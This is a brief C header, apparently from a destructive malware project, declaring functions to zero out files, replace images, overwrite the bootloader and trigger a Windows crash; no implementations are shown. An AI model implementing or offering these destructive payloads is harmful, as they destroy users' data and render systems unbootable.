#ifndef PAYLOADS_H
#define PAYLOADS_H

#define BUFFER_SIZE 4096
#define IMAGE_PATH "assets/image.jpg"

void ZeroOutFile(char* filename);
void ReplaceImage(char* filename);

void OverwriteBootloader();
void TriggerBSOD();

#endif